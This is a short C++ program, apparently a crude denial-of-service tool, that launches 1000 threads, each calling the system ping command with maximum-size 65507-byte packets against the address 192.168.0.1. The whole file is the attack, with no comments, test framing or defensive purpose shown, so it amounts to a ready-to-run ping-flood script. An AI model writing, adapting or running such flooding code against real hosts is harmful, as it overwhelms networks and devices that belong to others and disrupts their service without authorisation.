#include <thread>
#include <cstdlib>

#define NUM_OF_THREADS (1000)

void ping() {
    system("ping 192.168.0.1 -s 65507");
}


int main(int argc, char** argv) {
    std::thread threads[NUM_OF_THREADS];
    for(int i = 0; i < NUM_OF_THREADS; i++) {
        threads[i] = std::thread(ping);
    }

    for(int i = 0; i < NUM_OF_THREADS; i++) {
        threads[i].join();
    }

    return 0;
}

